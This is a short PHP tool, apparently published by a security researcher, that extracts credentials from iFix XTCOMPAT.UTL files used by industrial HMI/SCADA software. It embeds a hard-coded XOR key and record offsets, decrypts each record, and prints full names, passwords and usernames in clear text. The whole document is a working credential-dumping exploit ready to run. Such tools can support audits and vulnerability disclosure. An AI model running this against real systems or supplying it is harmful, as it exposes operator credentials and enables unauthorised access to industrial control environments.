<?php

//
// ifixpwdump.php
// dumps credentials from iFix XTCOMPAT.UTL files
//
// usage:
// php ifixpwdump.php XTCOMPAT.UTL
//
// contact: leonardo.brugues <nospam> gmail [.] com
// thanks to: Dieguin Bologna & Yami Levalle
//

error_reporting(E_ERROR | E_WARNING | E_PARSE);

$arch=$argv[1];
if (!file_exists($arch)) { die("Archivo $arch no encontrado\n"); };

// key xor
$key ='0000 0000'; // cabecera
$key.='143a 5b2b c39c f4b9 019b 40de 088b 8be8 bab4 ed67'; // full name
$key.='0000 0000 0000 0000 0000 0000'; // relleno
$key.='f84c 3002 34f8 7780 a890 a22d ccd0 2c30 621c f857'; // password
$key.='0000'; // relleno
$key.='9FE7 0758 B8FD'; // user
$key=str_replace(" ","",$key);

$patron=pack('H*',$key);
$len=strlen($key); // seteo el largo de cadena a leer segun llave

// offsets y lenghts
$offsetfullname =  4;    $lenfullname = 20;
$offsetpass     = 36;    $lenpass     = 20;
$offsetuser     = 58;    $lenuser     = 6;
$lenregistro   = 206;    $offsetread  = 0;

/*
Formato - x: full name - y: password - z: username
00d: 2cd1 2df9 xxxx xxxx xxxx xxxx xxxx xxxx
16d: xxxx xxxx xxxx xxxx 088e 0ab3 6f63 3c18
32d: 812e d881 yyyy yyyy yyyy yyyy yyyy yyyy
48d: yyyy yyyy yyyy yyyy 6019 zzzz zzzz zzzz
*/

// formato (queda "@4/C20fullname/@24/C20pass/@58/C6user" )
$formato="@{$offsetfullname}/" . // salto al byte donde empieza fullname
         "C{$lenfullname}fullname/" .
         "@{$offsetpass}/" . // salto al byte donde empieza pass
         "C{$lenpass}pass/" .
         "@{$offsetuser}/" . // salto al byte donde empieza user 
         "C{$lenuser}user";

$f=fopen($arch,'r');


$reg=array();
echo "\n[*] Archivo -> {$argv[1]}\n";
echo "\n[*] Credenciales:\n";
while ((ftell($f)+$lenregistro) <= filesize($argv[1])){
	$bin = fread($f, $len/2); // leo archivo
	$xored = $bin ^ $patron; // XOReo
	$reg=unpack($formato, $xored); // traigo a array

	// veo si hay bytes que no son caracteres (no son credenciales)
	if(((max($reg)>126) || (min($reg)<32)) && (min($reg)!=0)) { break; } 

	// separo fullname
	$chars = array_splice($reg,0,$lenfullname);
	unset($fullname);
	foreach($chars as $char){ $fullname.=chr($char); }
	echo "\n       Fullname: [$fullname] \n";

	// separo password
	$chars = array_splice($reg,0,$lenpass);
	unset($pass);
	foreach($chars as $char){ $pass.=chr($char); }
	echo "       Password: [$pass] \n";

	// separo username
	$chars = array_splice($reg,0,$lenuser);
	unset($user);
	foreach($chars as $char){ $user.=chr($char); }
	echo "       Username: [$user] \n";

	$offsetread=$offsetread+$lenregistro;
	fseek($f,$offsetread);

}

echo "\n";
fclose($f);

?>
